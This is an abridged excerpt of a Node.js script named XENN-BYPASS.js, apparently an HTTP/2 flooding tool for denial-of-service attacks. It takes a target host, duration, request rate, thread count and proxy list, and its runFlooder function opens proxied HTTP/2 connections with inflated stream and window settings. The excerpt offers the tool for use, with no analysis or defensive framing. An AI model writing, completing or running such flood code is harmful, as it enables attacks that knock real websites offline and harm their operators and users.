const net = require("net");
 ...
 if (process.argv.length < 7){console.log(gradient.vice(`[!] node XENN-BYPASS.js <HOST> <TIME> <RPS> <THREADS> <PROXY>.`));; process.exit();}
 const headers = {};
 ...
 function runFlooder() {
     ...
     Socker.HTTP(proxyOptions, (connection, error) => {
         ...
         const client = http2.connect(parsedTarget.href, {
             protocol: "https:",
             settings: {
            headerTableSize: 655360,
            maxConcurrentStreams: 20000,
            initialWindowSize: 655350,
            maxHeaderListSize: 655360,
            enablePush: false
          },
